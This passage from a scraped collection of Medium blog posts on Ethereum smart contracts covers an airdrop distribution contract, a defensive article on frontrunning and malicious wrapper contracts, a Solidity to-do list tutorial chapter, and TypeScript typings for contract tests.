of the code.Managing SubmissionsAs mentioned above, we need to put a few mechanisms in place to prevent just anyone from submitting any contract. Since the Airdrop Central contract interacts with 3rd party token contracts that could contain harmful code, we first need to review each submission to prevent problems.In order to do this we will receive submissions off-chain, review them manually, and then, if everything is ok, approve them.function approveSubmission(address _airdropper, address _tokenAddress) public onlyAdmin {        require(!airdropperBlacklist[_airdropper]);        require(!tokenBlacklist[_tokenAddress]);                tokenWhitelist[_tokenAddress] = true;    }At any point, if we detect a problem with either a submitted contract or an account submitting malicious contracts, we can revoke access to the associated tokens and put them in a blacklist to prevent new submissions. Doing this also causes tokens to be inaccessible for withdrawal.This could be controversial, as it allows the owner/admins to freeze the tokens within the contract at their will. But on the other hand, it\u2019s the only mechanism we have to fight malicious code that might have gone undetected when the token contract was first approved.function revokeSubmission(address _airdropper, address _tokenAddress) public onlyAdmin {        if(_tokenAddress != address(0)){            tokenWhitelist[_tokenAddress] = false;            tokenBlacklist[_tokenAddress] = true;        }                if(_airdropper != address(0)){            airdropperBlacklist[_airdropper] = true;        }            }If, for some reason, we blacklisted the wrong token/account or they were good citizens after all, the owner can remove them from the blacklist. This also re-enables the frozen tokens to be withdrawn.User Sign-up ProcessOnce the Airdrop Central contract has been deployed, users can start signing up. There are two ways to sign users up:They can do it themselves by calling the following function:function signUpForAirdrops() public ifNotPaused{        require(signups[msg.sender].userAddress == address(0));        signups[msg.sender] = User(msg.sender,now);        userSignupCount++;                E_Signup(msg.sender,now);    }Or an admin can sign them up by calling signupUsersManually(). Notice that, as opposed to a \u201cregular\u201d airdrop, the teams can\u2019t manually add users as we want to avoid \u201cspamming\u201d and adding users without their consent.function signupUsersManually(address _user) public onlyAdmin {        require(signups[_user].userAddress == address(0));        signups[_user] = User(_user,now);        userSignupCount++;                E_Signup(msg.sender,now);    }Additionally, users can remove themselves from the Airdrop Central to stop receiving tokens. Doing so also prevents them from being able to withdraw pending tokens. As a matter of fact they will be lost to them, so they should think twice before doing so.Token AirdropOnce a team has had their tokens approved by the Airdrop Central admin, they can perform any amount of airdrops for that token.First, they need to give an allowance of the tokens they want to distribute to the Airdrop Central contract. In order to do that, they need to call the approve() function on the token, specifying how many tokens they want to allow the Airdrop Central to use.Once that\u2019s taken care of, they can perform the airdrop by calling the following function:function airdropTokens(address _tokenAddress, uint _totalTokensToDistribute, uint _expirationTime) public ifNotPaused {        require(tokenWhitelist[_tokenAddress]);        require(!airdropperBlacklist[msg.sender]);                ERC20Basic token = ERC20Basic(_tokenAddress);        require(token.balanceOf(msg.sender) >= _totalTokensToDistribute);                //Multiply number entered by token decimals.        _totalTokensToDistribute = _totalTokensToDistribute.mul(10 ** uint256(token.decimals()));                // Calculate owner's tokens and tokens to airdrop        uint tokensForOwner = _totalTokensToDistribute.mul(ownersCut).div(100);        _totalTokensToDistribute = _totalTokensToDistribute.sub(tokensForOwner);                // Store the airdrop unique id in array (token address + id)        TokenAirdropID memory taid = TokenAirdropID(_tokenAddress,airdroppedTokens[_tokenAddress].length);        TokenAirdrop memory ta = TokenAirdrop(_tokenAddress,airdroppedTokens[_tokenAddress].length,msg.sender,now,now+_expirationTime,_totalTokensToDistribute,_totalTokensToDistribute,userSignupCount);        airdroppedTokens[_tokenAddress].push(ta);        airdrops.push(taid);                // Transfer the tokens        require(token.transferFrom(msg.sender,this,_totalTokensToDistribute));        require(token.transferFrom(msg.sender,owner,tokensForOwner));                E_AirdropSubmitted(_tokenAddress,ta.tokenOwner,ta.totalDropped,ta.airdropDate,ta.airdropExpirationDate);}The airdropTokens() function stores the tokens the contract was allowed to use in its internal balance. 2% of them are transferred to the contract owner and the rest are transferred to the contract. It can then distribute it among the users that were subscribed up to that moment.The team that performed the airdrop can also recover the tokens that remain unclaimed past the expiration date of each airdrop by calling this function:function returnTokensToAirdropper(address _tokenAddress) public ifNotPaused {        require(tokenWhitelist[_tokenAddress]); // Token must be whitelisted first                // Get the token        ERC20Basic token = ERC20Basic(_tokenAddress);                 uint tokensToReturn = 0;                for (uint i =0; i<airdroppedTokens[_tokenAddress].length; i++){            TokenAirdrop storage ta = airdroppedTokens[_tokenAddress][i];            if(msg.sender == ta.tokenOwner &&                airdropHasExpired(_tokenAddress,i)){                                tokensToReturn = tokensToReturn.add(ta.tokenBalance);                ta.tokenBalance = 0;            }        }        require(token.transfer(msg.sender,tokensToReturn));        E_TokensWithdrawn(_tokenAddress,msg.sender,tokensToReturn,now);}Token WithdrawalThe final thing we need to go over is the process by which the users withdraw the tokens they were sent. In order to do that, they need to call the withdrawTokens(address _tokenAddress) function. The function will go over all active (not yet expired or frozen) airdrops of the specified token and transfer them.function withdrawTokens(address _tokenAddress) ifNotPaused public {        require(tokenWhitelist[_tokenAddress]); // Token must be whitelisted first                // Get User instance, given the sender account        User storage user = signups[msg.sender];        require(user.userAddress != address(0));                uint totalTokensToTransfer = 0;        // For each airdrop made for this token (token owner may have done several airdrops at any given point)        for (uint i =0; i<airdroppedTokens[_tokenAddress].length; i++){            TokenAirdrop storage ta = airdroppedTokens[_tokenAddress][i];                        uint _withdrawnBalance = user.withdrawnBalances[_tokenAddress][i];                        //Check that user signed up before the airdrop was done. If so, he is entitled to the tokens            //And the airdrop must not have expired            if(ta.airdropDate >= user.signupDate &&                now <= ta.airdropExpirationDate){                                // The user will get a portion of the total tokens airdroped,                // divided by the users at the moment the airdrop was created                uint tokensToTransfer = ta.totalDropped.div(ta.usersAtDate);                                // if the user has not alreay withdrawn the tokens                if(_withdrawnBalance < tokensToTransfer){                    // Register the tokens withdrawn by the user and total tokens withdrawn                    user.withdrawnBalances[_tokenAddress][i] = tokensToTransfer;                    ta.tokenBalance = ta.tokenBalance.sub(tokensToTransfer);                    totalTokensToTransfer = totalTokensToTransfer.add(tokensToTransfer);                                    }            }        }        // Get the token        ERC20Basic token = ERC20Basic(_tokenAddress);         // Transfer tokens from all airdrops that correspond to this user        require(token.transfer(msg.sender,totalTokensToTransfer));                E_TokensWithdrawn(_tokenAddress,msg.sender,totalTokensToTransfer,now);    }Next StepsOne of the many things I\u2019d like to do next is to build a web interface (a dapp) that allows people to see the latest and upcoming airdrops and subscribe to them.If you are part of a team with an active ERC20 token, or you are planning on launching one and you\u2019d like to use the Airdrop Central to do an airdrop, drop me a line. Otherwise, any feedback and suggestions are greatly appreciated.I hope you enjoyed reading this article as much as I enjoyed writing it. I\u2019m currently taking consultancy jobs related to smart contracts development. If you are planning on raising funds through an ICO or building a Blockchain-based product, feel free to get in touch with me.", "responses": 14, "tags": ["Software Development", "Ethereum", "Tech", "Web Development", "Design"]}, {"title": "Mechanism Design Security in Smart Contracts", "post_link": "https://medium.com/@matthewdif/mechanism-design-security-in-smart-contracts-87f08555b38b?source=search_post", "author_name": "Matthew Di Ferrante", "author_link": "https://medium.com/@matthewdif", "publish_date": "2018-01-28", "last_modified_date": "2018-06-07", "readtime": "5.68", "claps": 820, "voters": 108, "content": "Mechanism Design Security in Smart ContractsMatthew Di FerranteFollowJan 28, 2018 \u00b7 6 min readInspired by 2-part series 6 Solidity Vulnerabilities and How to Stop Them, I thought I\u2019d write a bit about some of the more nuanced vulnerabilities that are related to mechanism design. In simple words, we will go over the vulnerabilities that arise from how smart contracts can interact with each other beyond what the author intended with the initial code.For now, I\u2019ll cover 2 main categories: Frontrunning and Malicious Smart Contract Wrapping. In a future article, I will go expand on some more complex game theory based flaws. Let\u2019s begin!FrontrunningFrontrunning is a term from the trading world, where if another trader can see you are making a large order before it hits the exchange (let\u2019s say, a large BUY order), they can put a smaller BUY \u201cin front\u201d of yours, and benefit from your order\u2019s movement of the market. They will sell right after your order executes, therefore having made some \u201crisk-free\u201d profit at your expense.In Ethereum, this is relevant as well for trading, but it has implications outside of that due to the transparent nature of the P2P network. Let\u2019s look at this contract as an example:A flawed bounty contractThe contract is fairly simple. The constructor sets a hash value and an amount of ETH, and sets that as the challenge for the prize. Anyone who can figure out what hashes to puzzle can claim the prize. There is nothing wrong in the solidity code per se, it is just naively programmed.The same way that an adversarial trader can frontrun your trade, so can an adversarial network user \u201cftontrun\u201d your solution here. If the adversary is aware of this contract (perhaps the prize for this solution is in the millions, and hence many are watching it), they can scan the network and check when someone submits a valid solution. Once they see this tx in the mempool, they can take the solution, and resubmit it with their own address with a higher gas price, and if they manage to get their tx in before you, they\u2019ll have stolen your prize!Of course, another scenario is the miners themselves stealing your prize. In that case, they don\u2019t even have to play the gas price game, they can simply choose not to include your tx in their block, and place their own in with the solution.Solution: Blinded CommitmentsThe way to solve this is to have the smart contract accept a hash as a potential solution to be revealed a few blocks later, and the hash must be constructed in a special way, as can be seen below in the fixed version of the contract:The solution can no longer be stolen due to the construction of the commitmentInstead of immediately providing the solution, the user hashes it with a salt and a their address as a blinding factor, as follows: commitment = H(solution, salt, eth_address). The commitment is then stored in the contract, and the time at which it is first submitted is recorded.If someone else tries to \u201csteal\u201d this commitment to frontrun you, the msg.sender check inside claim will fail. Since adversaries won\u2019t know the solution until you reveal it 60 blocks later, they would have to recreate the commitment then and wait another 60 blocks until they can even attempt to claim the prize. The smart contract enforces this by making sure that any solution must map to a commitment made at least 60 blocks before to be valid.In this way, the higher blockWait is, the lower the chance of an adversary succeeding, due to the fact that they would need to be able to censor your txs for up to blockWait times to succeed. For very high value prizes, blockWait can be up to days, and if an adversary can censor you or make the blockchain unavailable for days at a time, you have bigger problems to worry about.Malicious WrappersOnto the next topic, \u201cmalicious wrappers\u201d. The creator of the wrappers may not always intend to be malicious, but either way this covers cases where an external smart contract enables an interaction that the original author deemed undesireable.Let\u2019s look at everyone\u2019s favourite contract as an example, an ERC20 token ICO (with only the parts relevant to the security issue shown):A silly crowdsaleThe token above implements a crowdsale + ERC20 (I\u2019ve only implemented the transfer function for brevity\u2019s sake), which gives out tokens at a 1:1 ratio for ETH, until 100 ETH worth of tokens have been bought.After that, the contract stops issuing tokens, and the tokens are locked up for 30 days. Here is the focus of our \u201cvulnerability\u201d, or rather a way to (trustlessly) sidestep this protection through clever leveraging of smart contracts.Say we really wanted to be able to trade tokens before the 30 days. We could buy a bunch of tokens and start our own (off-chain) exchange and let users trade on that exchange, but that seems like a lot of work. Let\u2019s use a malicious wrapper to create a derivative of the token that is immediately tradeable:The TokenFuture DerivativeHere I\u2019ve created a TKN-FUT token contract that basically acts as a derivative, a futures contract on the original contract. When the owner creates the contract, they set which asset should underlie the derivative. Participants then send ETH to the buyThroughFutures method, which is forwarded to the Token's buyTokens function, making this TokenFutures contract the owner of the underlying Token tokens.The participants own TKN-FUT tokens, which when the underlying becomes tradeable, can be settle'd through the smart contract (for a settlement fee, which goes to the owner of the derivative contract).In this way, we have created a completely trustless derivative which allows us to trade (or speculate) on the original token before the token\u2019s \u201crelease\u201d time, and even allows us to settle our futures through the smart contract for the real thing when it\u2019s time!Solution: Well\u2026In this specific case, the simple solution here would be to just prevent smart contracts from being able to participate in the ICO. This can be done by ensuring that the caller of Token.buyTokens also submits an ECDSA signature which can be checked by ecrecover. This 100% prevents a smart contract from participating since smart contracts can never have private keys, hence they cannot sign.An example of a ecrecover check from Polkadot\u2019s SecondPriceAuction contract. This ensures the address `who` is an external account.NOTE: Do not use the EXTCODESIZE check to prevent smart contracts from calling a function. This is not foolproof, it can be subverted by a constructor call, due to the fact that while the constructor is running, EXTCODESIZE for that address returns 0.Although, the above is not a catch-all by any means. Not allowing smart contracts to participate may not be an option in your case, or maybe you want some kinds of derivatives created but not others.In that case, the technical solutions stop working and the \u201cgame theory\u201d theory solutions have to come in. You have to make undesirable or damaging behaviour unprofitable, because otherwise in a trustless, decentralized network, if an attack is profitable someone will eventually do it to your platform, and there\u2019s nothing you can do to stop them in most cases.That will be the focus of the next article. Follow me on Medium or Twitter so you can be the first to read it when I get around to it.P.S.If you\u2019re a smart contract auditor looking for work, I am looking to expand the team at ZK Labs \u2014 please contact me at matthew@zklabs.ioSimilarly if you need something audited or a second pair of eyes, feel free to contact me at the email above as well. Additionally, if your project is not-for-profit, I am happy to give advice free of charge, as long as I have time.", "responses": 9, "tags": ["Ethereum", "Smart Contracts", "Solidity", "Security", "Game Theory"]}, {"title": "Smart Contract project: To Do Notes and My New Book", "post_link": "https://medium.com/@merunasgrincalaitis/smart-contract-project-to-do-notes-and-my-new-book-8d569d4186a7?source=search_post", "author_name": "Merunas Grincalaitis", "author_link": "https://medium.com/@merunasgrincalaitis", "publish_date": "2018-04-05", "last_modified_date": "2018-06-19", "readtime": "13.0", "claps": 336, "voters": 60, "content": "Smart Contract project: To Do Notes and My New BookMerunas GrincalaitisFollowApr 5, 2018 \u00b7 14 min readThis is a fragment of my recently released book called \u201cEthereum Developer: Learn Solidity From Scratch\u201d. It\u2019s a book that I wrote from my experience working in about 5 different startups where I learned different things about creating Smart Contracts, decentralized applications and audits.You can find the book here on amazon free with kindle unlimited: https://www.amazon.com/dp/B07BJB1YNQ it covers everything you need to know from scratch including web3.js, dapps, audits and much more. Be sure to check the index to see if it could help you.In this article I\u2019ll give you for free a chapter of the book to show you what you\u2019ll find in it so that you see if you are interested in the book or not.Chapter 13 of the book, Smart Contract project: To Do notesLet\u2019s put your new gained knowledge to practice with a cool project that you\u2019ll love.This is how the application will look like once the Smart Contracts, front end and web3.js integration is completeAll projects should start with a clear specification of what we want to achieve because otherwise you\u2019ll waste time adding unnecessary features and making things differently from the initial goal.When you\u2019re working with a client, make sure you\u2019re understanding what they want to create with as much detail as possible. When working with ICOs, read carefully the whitepaper.This project is no different. Here\u2019s the specification that you\u2019ll be following to create this simple Smart Contract project:\u201cWe want to create a decentralized To Do application that allows users to store simple notes of no more than 32 letters. Each note must contain the date it was created, the address of the owner and if it\u2019s already completed or not. Any user will be able to create notes but only the owner of each note will be able to mark them as completed.\u201dLet\u2019s analyze for a second the specification to understand what we must do:The notes are limited to 32 letters. This means that we\u2019ll use bytes32 for the content of the note since it\u2019s the most optimized way to store them.The notes must contain the date they were created. We\u2019ll use the global variable now to get the current time.The notes have to contain the address of the owner that created that note. We\u2019ll use msg.sender to get the address of that user and store it in mapping.A function to mark the notes as completed. This means that we\u2019ll have to create a struct Notes with the information required and we\u2019ll create a function to update the state of each note.Only the owner will be able to modify the notes. We\u2019ll do this with a new type of function called modifier that allows us to make checks before doing any type of calculation. We\u2019ll use it to compare the address of the sender to the address of the owner of the note.Let\u2019s start by creating a folder in the desktop called todo-dapp and then a file called TodoList.sol. This will be the contract with all the logic. In the real world you usually create a Web3.js web app to interact with the contract. We\u2019ll do that later in this book so make sure you get this part working properly.Inside TodoList.sol, create the base Smart Contract layout:pragma solidity 0.4.20;contract TodoList {}Now you may be asking yourself. Where do I start with this application? Well, the main component of this contract is the Note element. Which is just a struct with several variables. Let\u2019s create that:pragma solidity 0.4.20;contract TodoList {   struct Todo {      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }}Timestamp is the date that the note was created. The other fields are based on the specification.We now need a way to store those notes. We could use an array or a mapping. In this case we\u2019ll use both because each person, each address will have several notes and that can be accomplished with an array. We use a mapping because it allows us to get all the notes from a user with just his address without looping.pragma solidity 0.4.20;contract TodoList {   struct Todo {      uint256 id;      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }   uint256 public constant maxAmountOfTodos = 100;      // Owner => todos   mapping(address => Todo[maxAmountOfTodos]) public todos;      // Owner => last todo id   mapping(address => uint256) public lastIds;}Note that you can make comments with a double forward slash // for line comments or with a slash with asterisk /**/ for block comments.Here\u2019s what I just did:I\u2019ve defined a variable called maxAmountOfTodos which is used to limit the amount of to-do notes each user can have. This is required to avoid that the number of notes that a user creates grows endlessly since we have gas limitations.The mapping todos is where the notes will be stored for each user address.The mapping of lastIds is just a way to keep track of the last ID used for each user, required to add new notes since we are using a fixed-size array in the todos mapping.I like to add a comment on top of each mapping to indicate exactly what the variables inside the mapping mean for clarity purposes. It\u2019s very important to document your code with lots of comments. It will help you understand and debug your code faster.Keep in mind that this is not the best possible solution for this specification. It\u2019s just my way of doing things. You could read the specification and store the notes in a single array in an efficient way. Don\u2019t take my word. Try it yourself without copying the code and see what you can do by yourself.At this point we can start creating the functions for this application. We\u2019ll need a way to add notes to the mapping of todos. Here\u2019s how I did it:pragma solidity 0.4.20;contract TodoList {   struct Todo {      uint256 id;      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }   uint256 public constant maxAmountOfTodos = 100;      // Owner => todos   mapping(address => Todo[maxAmountOfTodos]) public todos;   // Owner => last todo id   mapping(address => uint256) public lastIds;      modifier onlyOwner(address _owner) {      require(msg.sender == _owner);      _;   }   // Add a todo to the list   function addTodo(bytes32 _content) public {      Todo memory myNote = Todo(lastIds[msg.sender], _content, msg.sender, false, now);      todos[msg.sender][lastIds[msg.sender]] = myNote;      if(lastIds[msg.sender] >= maxAmountOfTodos) lastIds[msg.sender] = 0;      else lastIds[msg.sender]++;   }}That\u2019s some new stuff over there. Don\u2019t be scared. Here\u2019s what I did:I\u2019ve created a modifier called onlyOwner to limit the access of the next function. Because we only want to allow the owner of each note to be able to modify his own notes. You\u2019ll later see where it\u2019s used.Then I created the function addTodo with the parameter _content which is the content of the note to create. Inside this function, I\u2019m creating a memory note called myNote and then I\u2019m adding that note to the array of notes of that user, in the mapping todos.Finally, I\u2019m updating the lastId of that user from the lastIds mapping to be able to add new notes since you need to know the index of each element inside the fixed-size array of todos.The parameters of the functions in Solidity usually have an underscore _ in front of them. This is to avoid problems with variables using the same name. For instance:bytes32 content;function addTodo(bytes32 content) {}Notice that those 2 content variables use the same name. This won\u2019t work because in Solidity you can\u2019t use already existing names inside the function. So, we always add an underscore in the function parameters to avoid this problem.Take a look at the struct instance myNote. Do you see something unusual? If you said \u201cThe keyword memory is new, I don\u2019t know what\u2019s that, please explain\u201d you are correct. Memory is a special word that you can use before the variable name when you declare the variable.It indicates that you don\u2019t want to store that variable on the blockchain. It keeps the variable in the memory of the user\u2019s computer executing that code and it\u2019s deleted after the function execution. We must do this on the struct instance Todo because without the memory keyword, Solidity tries to declare variables in storage.This means that when you create a new struct instance, Solidity tries to store it in the storage which is permanently writing information on the blockchain. The Ethereum Virtual Machine has three areas where it can store items.The first is \u201cstorage\u201d, where all the contract state variables reside. Every contract has its own storage and it is persistent between function calls and quite expensive to use.The second is \u201cmemory\u201d, this is used to hold temporary values. It is erased between (external) function calls and is cheaper to use.The third one is the stack, which is used to hold small local variables. It is almost free to use, but can only hold a limited amount of values.For almost all types, you cannot specify where they should be stored, because they are copied every time they are used.The types where the so-called storage location is important are structs and arrays. If you e.g. pass such variables in function calls, their data is not copied if it can stay in memory or stay in storage. This means that you can modify their content in the called function and these modifications will still be visible in the caller.In summary: you have to add the keyword \u201cmemory\u201d to temporary structs and arrays inside functions for avoiding problems with the blockchain storage.I highly recommend you to use the Remix IDE for developing Smart Contracts. It\u2019s a web app where you can write contracts and see errors immediately. You can access it on Remix.ethereum.org. Then, search for \u201cRemix Ethereum tutorial\u201d on youtube to understand how it works. Later in this book you\u2019ll see how it\u2019s used to deploy Smart Contracts on the Ropsten and main Ethereum blockchain networks.All the Smart Contract code that I write ends up in that IDE because it helps me spot errors quickly. It also allows you to execute the functions of your Smart Contract in the real Ethereum blockchain. You\u2019ll need Metamask which is an extension for browsers that allow you to connect to the blockchain.Before continuing with this I want you to do these 2 tasks:Learn how to use the Remix code editor by looking at videos on youtube. You can use it for free at http://Remix.ethereum.orgInstall Metamask and learn how to use it by searching videos. You can install it by going to Metamask.io.Those tools are a must to any Ethereum developer.After that we can continue with the project on the Remix IDE. The next step is to mark to-dos as completed. We\u2019ll do that with a function:pragma solidity 0.4.20;contract TodoList {   struct Todo {      uint256 id;      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }   uint256 public constant maxAmountOfTodos = 100;      // Owner => todos   mapping(address => Todo[maxAmountOfTodos]) public todos;   // Owner => last todo id   mapping(address => uint256) public lastIds;   // Add a todo to the list   function addTodo(bytes32 _content) public {      Todo memory myNote = Todo(lastIds[msg.sender], _content, msg.sender, false, now);      todos[msg.sender][lastIds[msg.sender]] = myNote;         if(lastIds[msg.sender] >= maxAmountOfTodos) lastIds[msg.sender] = 0;      else lastIds[msg.sender]++;   }   // Mark a todo as completed   function markTodoAsCompleted(uint256 _todoId) public {      require(_todoId < maxAmountOfTodos);      require(!todos[msg.sender][_todoId].isCompleted);      todos[msg.sender][_todoId].isCompleted = true;   }}Here\u2019s what I just did:I added the function markTodoAsCompleted which will allow us to mark a to-do as completed whenever the user wants. I simply get the specific to-do from the _todoId sent by the user of the application to mark it as completed.You see that I\u2019m using a new global function called require. This is a very important function that allows us to check some conditions before executing that function. In this case I\u2019m saying: \u201cRequire that the to-do id sent is smaller than the maximum number of to-dos\u201d and \u201cRequire that the to-do selected is not completed\u201d.Most of the require statements are used at the top of the function for checking the parameters of the function even though you can use the require function wherever you want. I\u2019m using the exclamation sign ! in front of the boolean value to negate and invert the condition.If require results true, the function executes. If require results in false, the function execution is stopped, and the user will receive an error. The remaining gas will be refunded to the user.Finally, I set the selected to-do as completed.When a user executes a function from the Smart Contract, he needs to send some amount of gas. The minimum amount of gas required to execute any function inside a Smart Contract is 21000 and can be up to 8 million. It\u2019s just a fee that gets converted to ether that miners receive for processing the transaction, in this case, a function execution in your Smart Contract.In Solidity you can use for and while loops:A for loop in Solidity is limited by the gas that you send to the Smart Contract. It will continue looping until it loops all the items or until it runs out of gas. Because in each iteration it\u2019s consuming gas for processing that code. In essence, this means that your for loops are limited to a specific number of loops, you can\u2019t loop endlessly. Here\u2019s the syntax for a for loop:for(uint256 i = 0; i < myArray.length; i++) {   // Do something with the array}That\u2019s why for and while loops are not recommended in Solidity because you\u2019ll probably run into gas problems.It\u2019s your job to optimize the code and to make sure that the loops are not breaking the gas limits by limiting the arrays like I did in this case.You may have noticed that the function markTodoAsCompleted can be executed by anyone that knows the address of this Smart Contract once it\u2019s deployed. By default, all functions are public. This means that anyone that has the contract code can execute and see all the functions.However, we don\u2019t want that. In this case we want to only allow the to-do owner to modify his own notes. That\u2019s the main reason we have an owner parameter in the to-do struct. Luckily, we can do that in Solidity with a very powerful component called modifiers. Let\u2019s see how it will be used in this project:pragma solidity 0.4.20;contract TodoList {   struct Todo {      uint256 id;      bytes32 content;      address owner;      bool isCompleted;      uint256 timestamp;   }   uint256 public constant maxAmountOfTodos = 100;   // Owner => todos   mapping(address => Todo[maxAmountOfTodos]) public todos;   // Owner => last todo id   mapping(address => uint256) public lastIds;   modifier onlyOwner(address _owner) {      require(msg.sender == _owner);      _;   }   // Add a todo to the list   function addTodo(bytes32 _content) public {      Todo memory myNote = Todo(lastIds[msg.sender], _content, msg.sender, false, now);      todos[msg.sender][lastIds[msg.sender]] = myNote;      if(lastIds[msg.sender] >= maxAmountOfTodos) lastIds[msg.sender] = 0;      else lastIds[msg.sender]++;   }   // Mark a todo as completed   function markTodoAsCompleted(uint256 _todoId) public onlyOwner(todos[msg.sender][_todoId].owner) {      require(_todoId < maxAmountOfTodos);      require(!todos[msg.sender][_todoId].isCompleted);      todos[msg.sender][_todoId].isCompleted = true;   }}You can see that I created a modifier called onlyOwner. A modifier is like a function that gets execute before the actual function. You first define the modifier, which usually has a require statement inside, then you add the underscore _; which indicates that the code will be inserted below that underscore if you pass the require checks successfully.Finally, you have to add that modifier to the function that you want to be affected. The modifier will be executed before the actual function every time. You have to write it after the name of the function, before the opening curly bracket of the function affected {.Are you still following me? Great.In this case I\u2019m creating the modifier onlyOwner, which receives an address and checks if the user that executed that modifier is the owner that you sent him. Then I added the modifier to the function markTodoAsCompleted to only allow the modification of that note by the owner of it.Yes, it\u2019s a lot of information but you\u2019ll see how powerful the modifiers are. You\u2019ll get used to them pretty quickly as you write Smart Contracts. The structure of a modifier usually is:modifier <name>(<parameters>) {   require(<something>);   _;}You can also add parameters to the modifiers. Otherwise, you have to remove the brackets (<parameters>).Now the function markTodoAsCompleted is only executable by the owner of the note selected by the id. Your private notes are safe now!Here\u2019s what you accomplished so far:You created a contract called TodoLists whose purpose is to create and modify to-do notes.Then you defined the structure of an individual To-do and you created the mapping of all the notes for each user.Then you created a function to add new to-dos to the sender address. Also, you added a function to mark the to-dos as completed.Finally, you\u2019ve restricted the access of the to-dos to only allow modification of the to-dos a user owns with the modifier only owner.Your application is complete. Users can create their own decentralized to-dos using your Smart Contract. Let\u2019s recap what you have learned by doing this project:You know how to understand a specification to extract the information that you need to create your Smart Contract.You know that you have to start a Smart Contract by defining the main variables and components.You know how to create functions in Solidity with return values named or not.You know how to create struct instances using the memory keyword.You know when and how you must use the function require to check for conditions.You know how to create modifiers with or without parameters and you know that you can add as many modifiers as you want to each function.Congratulations. Now you have the basic knowledge of Solidity.I want you to do another project on your own. Look at some simple applications on android that you could replicate with a Smart Contract to make them decentralized. You could even make a game with mappings and structs to keep track of the players and scores.Be creative.The most important thing is that you apply your knowledge with something on your own. Try to complete it in a day or two. You\u2019ll learn a lot and you\u2019ll have something to show to people that will want to hire you.I encourage you to write an article on medium about your own project. It will grow your personal brand which will give you lots of employment opportunities and contract work related to Ethereum.Do let me know what you created. Send me an email to merunasgrincalaitis@gmail.com saying \u201cHi\u201d with your experience learning Solidity. I\u2019d love to hear from you.Here are some specifications that you can use to create a Smart Contract for practicing your skills:\u201cA decentralized recipe application. People post their best food recipes and external users rate the them. They can also indicate that they made the recipe for showing the most popular recipes. The creator of the recipe can write up to 1000 words and add images with external links. Each recipe has a title and the estimated time to make it. Recipes can have tags for improving the search experience.\u201d\u201cA decentralized calendar used by sports people where they indicate what sports did they play each day along with the approximate time dedicated to physical activity. They also rate their day based on the intensity of the sport\u201d\u201cA decentralized social travel platform where users can chat and exchange experiences. When a new user visits a new country, he can get recommendations from locals who earn a virtual token that can be exchanged for ether inside the same contract.\u201dContinue reading once you complete your own project since the next part will go into much detail about the complex parts of Solidity. The basics are essential. Remember to share what you learned. Send me an email or tweet me with your progress.This is the end of the chapter 13 of the book Ethereum Developer: Learn Solidity From Scratch. You can find the book here: https://www.amazon.com/dp/B07BJB1YNQ and it will be free if you have kindle unlimited.Let me know what do you think.", "responses": 5, "tags": ["Ethereum", "Blockchain", "Solidity", "Smart Contracts", "Proof Of Stake"]}, {"title": "How TypeScript Makes Smart Contracts Easier to Test and More Robust", "post_link": "https://blog.hellobloom.io/how-typescript-makes-smart-contracts-easier-to-test-and-more-robust-c612a2d99537?source=search_post", "author_name": "John Backus", "author_link": "https://blog.hellobloom.io/@jbackus", "publish_date": "2017-11-16", "last_modified_date": "2018-06-19", "readtime": "4.18", "claps": 599, "voters": 58, "content": "How TypeScript Makes Smart Contracts Easier to Test and More RobustJohn BackusFollowNov 16, 2017 \u00b7 5 min readIntegrating with smart contracts can be tough. In particular, solidity doesn\u2019t really have runtime errors with descriptive messages, so a lot of failed transactions just fail with the generic message invalid opcode.If it is painful to write tests, you are probably going to write fewer. Test coverage is an important piece of the puzzle for building robust software. At Bloom, we want to do our best to build reliable contracts so we quickly looked for strategies to reduce this testing pain.Writing tests for smart contracts can be especially tough. In the example gif below, I\u2019m trying to test the buyTokens function and I make a series of mistakes along the way. The test output usually tells me something is wrong, but not much more.The mistakes in this example are:Saying amount: 50 instead of value: 50 to specify how much wei to send in a transactionCalling balanceOf on a sale contract instead of a token contractForgetting to wait for the Promise to resolve when getting the return value from a contract functionSending ether to a non-payable functionThese are all mistakes I\u2019ve made a few times before while writing contract tests and it can take much longer to resolve the issues than it takes in the gif above.We have the technologyThe frustrating thing when writing these javascript tests for our contracts is that all of the type information is sitting right next door in our contracts. In fact, our truffle compile step also puts the very simple contract ABIs in our build folder. For the really simple contract we\u2019re testingpragma solidity ^0.4.15;import \"zeppelin/crowdsale/Crowdsale.sol\";contract SimpleSale is Crowdsale {   function SimpleSale (    uint256 _startTime,    uint256 _endTime,    uint256 _rate,    address _wallet  ) Crowdsale(_startTime, _endTime, _rate, _wallet) {  }}the ABI has a lot of helpful type info:[  {    \"constant\": true,    \"inputs\": [],    \"name\": \"rate\",    \"outputs\": [{ \"name\": \"\", \"type\": \"uint256\" }],    \"payable\": false,    \"type\": \"function\"  },  {    \"constant\": false,    \"inputs\": [{ \"name\": \"beneficiary\", \"type\": \"address\" }],    \"name\": \"buyTokens\",    \"outputs\": [],    \"payable\": true,    \"type\": \"function\"  },  // ...]This is only two of the functions the contract exposes, but for these two we see:The function rate does not take any arguments, it does not accept ether, and it returns a 256 bit integerThe function buyTokens takes an address as an argument, it doesn\u2019t return anything, and it accepts etherWith a little bit of elbow grease, we can translate this knowledge into TypeScript typings:import * as Web3 from \"web3\";import * as BigNumber from \"bignumber.js\";type Address = string;type TransactionOptions = Partial<Transaction>;type PayableTransactionOptions = Partial<PayableTransaction>;type UInt = number | BigNumber.BigNumber;interface Transaction {  hash: string;  nonce: number;  blockHash: string | null;  blockNumber: number | null;  transactionIndex: number | null;  from: Address | ContractInstance;  to: string | null;  gasPrice: UInt;  gas: number;  input: string;}interface PayableTransaction extends Transaction {  value: UInt;}interface ContractInstance {  address: string;  sendTransaction(options?: PayableTransactionOptions): Promise<void>;}export interface SimpleSaleInstance extends ContractInstance {  rate(options?: TransactionOptions): Promise<BigNumber.BigNumber>;  buyTokens(    beneficiary: Address,    options?: PayableTransactionOptions  ): Promise<void>;  // Etc...}This builds on the fantastic web3 typings from the 0x project. Configuring our workspace to use TypeScript typings improves our workflow a lot compared to the gif earlier. Take a look:TypeScript catching mistakesIn this example, the TypeScript typings are:Giving me a list of functions I can call on saleTelling me the arguments for buyTokensReminding me that the function returns a promise which I need to wait forCorrecting me when I type amount instead of value for specifying how much ether to sendReminding me to change sale to token for calling balanceOfPointing out that I cannot send ether to balanceOf and therefore I\u2019m not allowed to specify value as an optionPretty big difference! Every mistake I had to figure out after seeing the test fail in the first example was shown to me immediately in my editor. Thanks, 